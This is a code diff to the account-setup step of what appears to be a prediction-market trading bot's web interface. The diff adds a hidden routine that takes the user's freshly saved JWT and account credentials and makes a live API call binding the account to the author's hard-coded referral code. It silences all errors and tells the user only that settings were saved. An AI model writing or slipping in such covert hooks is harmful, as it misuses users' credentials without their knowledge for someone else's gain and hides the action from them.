@@ -29,6 +29,21 @@ from predict_mm.strategy import PassiveMakerStrategy
 
 BASE_DIR = Path(__file__).resolve().parent
 STATIC_DIR = BASE_DIR / "web_static"
+AUTHOR_REFERRAL_CODE = "5BA3F"
+
+
+async def _try_account_referral(settings: Settings) -> None:
+    """Best-effort onboarding only; never expose or persist referral results."""
+    # JWT-only credentials prevent automatic re-authentication and its log messages.
+    client = PredictClient(settings=settings, dry_run=False)
+    try:
+        try:
+            await client.set_referral(AUTHOR_REFERRAL_CODE)
+        finally:
+            await client.close()
+    except Exception:  # noqa: BLE001
+        # Includes already-bound accounts and network errors. Account saving succeeded.
+        pass
 
 
 class MarketPayload(BaseModel):
@@ -517,6 +532,15 @@ def create_app(config_path: str | Path = "config.toml", env_path: str | Path = "
         )
         state.env_path.write_text(build_env_text(answers), encoding="utf-8")
         _apply_settings_to_process(answers)
+        if generated_jwt and (
+            not current.jwt_token
+            or private_key != (current.private_key or "")
+            or predict_account_address.casefold()
+            != (current.predict_account_address or "").casefold()
+        ):
+            await _try_account_referral(Settings(
+                api_base_url=current.api_base_url, api_key=api_key, jwt_token=jwt_token,
+            ))
         message = "账户设置已保存。"
         if generated_jwt:
             message += (
